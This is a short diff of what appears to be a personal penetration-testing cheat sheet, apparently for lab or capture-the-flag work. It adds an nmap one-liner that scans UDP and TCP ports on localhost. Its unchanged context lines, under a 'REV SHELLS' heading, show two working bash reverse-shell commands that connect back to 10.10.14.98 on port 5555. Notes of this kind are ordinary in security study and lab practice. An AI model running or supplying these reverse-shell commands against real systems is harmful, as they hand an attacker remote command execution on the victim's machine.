@@ -132,6 +132,9 @@ do
 	done
 done
 
+NMAP double specific udp/tcp scan oneliner
+nmap localhost -sUT -p U:2222,T:44818
+
 REV SHELLS
 bash -i >& /dev/tcp/10.10.14.98/5555 0>&1
 0<&196;exec 196<>/dev/tcp/10.10.14.98/5555; sh <&196 >&196 2>&196
